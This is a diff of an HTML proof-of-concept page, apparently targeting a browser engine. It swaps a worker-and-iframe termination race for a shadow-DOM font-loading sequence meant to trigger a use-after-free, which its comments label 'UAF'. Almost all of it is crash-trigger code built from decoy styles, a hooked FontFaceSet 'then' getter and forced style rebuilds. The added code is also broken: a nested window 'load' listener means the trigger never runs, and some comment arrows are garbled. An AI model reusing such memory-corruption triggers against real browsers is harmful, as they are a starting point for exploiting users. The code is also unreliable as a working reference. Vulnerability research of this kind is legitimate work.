@@ -1,55 +1,88 @@
 <!DOCTYPE html>
-<html>
 <body>
+<pre id="log"></pre>
 <script>
-const workerCode = `
-  self.onmessage = function(e) {
-    // 1. Enfileira múltiplas tasks na thread principal via postTask([this, ...])
-    // que não verificam m_askedToTerminate (como postExceptionToWorkerObject)
-    // ou que acessam m_pageInspector / m_scriptExecutionContext.
-    for (let i = 0; i < 50; i++) {
-      postMessage({ idx: i, buf: new ArrayBuffer(64) });
-      console.log("msg", i);
+
+function log(msg) { document.getElementById("log").append(msg + "\n"); }
+window.addEventListener("load", () => setTimeout(() => {
+document.fonts;
+const timestamp = Date.now();
+const FONT_URL = `https://slowfil.es/file?type=woff2&delay=120000&nocache=${timestamp}`;
+const FAMILY   = "TestFontB";
+const N = 32; // número de decoys para forçar o rehash
+
+window.addEventListener("load", () => setTimeout(() => {
+
+    // Shadow A: usa a fonte, força font loading
+    const hostA = document.createElement("div");
+    document.body.appendChild(hostA);
+    const rootA = hostA.attachShadow({ mode: "open" });
+    rootA.innerHTML =
+        `<style>@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
+        `.p{font:24px ${FAMILY}}</style><span class="p">A</span>`;
+
+    // Shadow B: alvo — tem @font-face + style removível
+    const hostB = document.createElement("div");
+    hostB.style.display = "none";
+    document.body.appendChild(hostB);
+    const rootB = hostB.attachShadow({ mode: "open" });
+    const gadgetStyle = document.createElement("style");
+    gadgetStyle.textContent = ".gadget { color: navy; }";
+    rootB.appendChild(gadgetStyle);
+    const fontStyle = document.createElement("style");
+    fontStyle.textContent =
+        `@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
+        `.p{font:24px ${FAMILY}}`;
+    rootB.appendChild(fontStyle);
+    const target = document.createElement("span");
+    target.textContent = "B";
+    rootB.appendChild(target);
+
+    // 32 decoys: cada um com style único — ao serem reconstruídos crescem o mapa
+    const decoys = Array.from({ length: N }, (_, i) => {
+        const h = document.createElement("div");
+        h.style.display = "none";
+        document.body.appendChild(h);
+        const r = h.attachShadow({ mode: "open" });
+        const s = document.createElement("style");
+        s.textContent = `.d${i} { color: rgb(${i},1,2); }`;
+        r.appendChild(s);
+        r.appendChild(document.createElement("span"));
+        return { root: r, style: s };
+    });
+
+    document.body.offsetHeight; // força layout inicial
+    document.fonts.load(`24px ${FAMILY}`, "A");
+
+    if (document.fonts.status !== "loading") {
+        log("SKIP: fonte nao esta em loading — tente aumentar o delay ou verificar conexao");
+        return;
     }
 
-    // 2. Dispara erro assíncrono + encerramento imediato da thread.
-    // Quando m_workerGlobalScope = nullptr rodar na thread do worker,
-    // ele postará workerGlobalScopeDestroyed() para a thread principal.
-    setTimeout(() => {
-      self.close();
-      throw new Error("trigger_postExceptionToWorkerObject");
-    }, 0);
-  };
-`;
+    document.fonts.ready; // materializa a promise
 
-const blobURL = URL.createObjectURL(new Blob([workerCode], { type: "application/javascript" }));
+    Object.defineProperty(FontFaceSet.prototype, "then", {
+        configurable: true,
+        get() {
+            delete FontFaceSet.prototype.then;
+            // força construção de 32 novos resolvers ? mapa cresce ? rehash
+            document.body.offsetHeight;
+            return undefined;
+        }
+    });
 
-function triggerGC() {
-  for (let i = 0; i < 64; i++) {
-    new ArrayBuffer(1024 * 1024);
-  }
-}
+    // Forçar Reconstruct (remove, não append):
+    decoys.forEach(d => d.style.remove());
+    gadgetStyle.remove();
 
-function runIteration() {
-  const iframe = document.createElement("iframe");
-  document.body.appendChild(iframe);
+    document.styleSheets.length; // flush — dropa resolvers existentes
 
-  const w = new iframe.contentWindow.Worker(blobURL);
-  w.postMessage("start");
+    // Invalidação por atributo ? createOrFindSharedShadowTreeResolver ? UAF
+    target.id = "boom";
 
-  // Assim que a primeira mensagem voltar, garantimos que o worker já rodou
-  // e enfileirou as demais tasks + self.close().
-  w.onmessage = () => {
-    w.onmessage = null;
+    log("VIVO — sem crash (bug nao presente ou ja corrigido)");
+}, 0));
+}, 500));
 
-    // Remove o iframe ou limpa o documento para forçar ScriptExecutionContext::stopActiveDOMObjects()
-    // -> Worker::stop() -> workerObjectDestroyed()
-    iframe.remove();
-    triggerGC();
-  };
-}
-
-setInterval(runIteration, 40);
 </script>
 </body>
-</html>
